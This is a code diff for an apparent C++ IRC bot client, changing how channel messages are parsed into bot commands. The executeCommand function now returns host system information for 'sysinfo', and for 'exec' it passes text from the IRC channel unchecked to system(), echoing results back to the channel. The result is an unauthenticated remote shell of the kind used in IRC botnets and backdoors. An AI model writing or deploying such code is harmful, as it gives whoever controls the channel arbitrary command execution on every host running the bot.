@@ -83,24 +83,31 @@ void parseData(IRCClient* ircc, std::string data, char IRC_CommandPrefix) {
 	// Command
 	stop = data.find(" ", stop);
 	command = data.substr(stop +1, size -2);
-	//command = command.substr(0, command.size() -2);
 
+
+	// Params
 	stop = command.find_first_of(" ");
 	if(stop != std::string::npos) {
 		params = command.substr(stop +1, command.size() -1);
 		command = command.substr(0, stop);
 	}
 	
-	if(command.at(0) != IRC_CommandPrefix)
-		return;
+	// If Bot command was recieved
+	if(command.at(0) == IRC_CommandPrefix) {
+		// Remove special char
+		command = command.substr(1, command.size() -1);
+		std::string result = "";
 
-	// Remove special char
-	command = command.substr(1, command.size() -1);
+		// Execute command and save result
+		result = executeCommand(command, params);
 
-	std::string result = "";
-	result = executeCommand(command, params);
-	if(!result.empty())
-		ircc->sendMessage(ircc->getIRCChannels()[0], result);
+		// If there was a result message, send it to the server
+		if(!result.empty())
+			ircc->sendMessage(ircc->getIRCChannels()[0], result);
+
+	} else {
+		// TODO
+	}
 
 	return;
 }
@@ -109,8 +116,9 @@ void parseData(IRCClient* ircc, std::string data, char IRC_CommandPrefix) {
 std::string executeCommand(std::string command, std::string args) {
 	std::string result;
 	if(!command.compare("sysinfo")) {
-
+		result = OSInfo::sysInfoStr();
 	}
+
 	if(!command.compare("exec")) {
 		system(args.c_str());
 		result = args;
